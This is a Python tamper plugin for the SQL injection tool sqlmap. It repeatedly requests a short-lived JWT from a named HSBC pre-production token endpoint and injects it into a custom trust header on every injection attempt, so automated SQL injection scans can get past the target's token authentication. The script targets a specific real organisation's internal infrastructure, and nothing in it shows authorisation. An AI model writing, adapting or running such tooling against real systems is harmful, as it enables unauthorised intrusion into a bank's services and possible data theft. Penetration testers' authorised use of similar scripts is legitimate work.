#!/usr/bin/env python3
# encoding: utf-8
#
# Tamper script for SQLmap: automatically refreshes the short‑lived JWT
# and injects it into the X‑HSBC‑E2E‑Trust‑Token header on every request.
#
# Place this file into your tamper directory and invoke with:
#   sqlmap … --tamper=auth_token_refresh.pyd

import time
import json
import base64

try:
    # SQLmap’s internal enum for tamper priority
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.NORMAL
except ImportError:
    # fallback if running outside of SQLmap install
    __priority__ = 0

# ─── CONFIGURATION ──────────────────────────────────────────────────────────────
# Update these to match your environment:
TOKEN_URL = "https://cmb-i b2b-dsp-pprod-eu.systems.uk.hsbc:8443" \
            "/dsp/rest-sts/DSP_iB2B/iB2B_tokenTranslator?_action=translate"
USERNAME  = ""
PASSWORD  = ""
# ────────────────────────────────────────────────────────────────────────────────

# Global cache for token and expiry time
_cached_token  = None
_expiry_unix   = 0.0

def _fetch_new_token():
    """
    POST to the DSP_iB2B tokenTranslator endpoint, parse out the issued_token,
    and reset our expiry clock to ~25s from now (so we refresh before 30s expiry).
    """
    global _cached_token, _expiry_unix

    # build the JSON body
    body = {
        "input_token_state": {
            "token_type": "CREDENTIAL",
            "username": USERNAME,
            "password": PASSWORD
        },
        "output_token_state": {
            "token_type": "JWT"
        }
    }
    data = json.dumps(body).encode("utf-8")

    # perform the HTTPS request
    import urllib.request
    req = urllib.request.Request(
        TOKEN_URL,
        data=data,
        headers = {
            "Content-Type": "application/json"
        }
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        resp_json = json.loads(resp.read().decode("utf-8"))

    # extract token and set next-refresh threshold
    _cached_token = resp_json.get("issued_token", "")
    # refresh after 25s so we never send an expired token
    _expiry_unix  = time.time() + 25
    return _cached_token

def dependencies():
    """
    SQLmap calls this once at startup. Grab the first token here.
    """
    _fetch_new_token()

def tamper(payload, **kwargs):
    """
    Called for each injection attempt. We ignore the payload itself and
    instead ensure our header is up-to-date.
    """
    global _cached_token, _expiry_unix

    # refresh if we're past our refresh threshold
    if not _cached_token or time.time() >= _expiry_unix:
        _fetch_new_token()

    # kwargs['headers'] is the dict of outgoing headers
    headers = kwargs.get("headers")
    if isinstance(headers, dict):
        headers["X-HSBC-E2E-Trust-Token"] = _cached_token

    # return the payload unchanged
    return payload
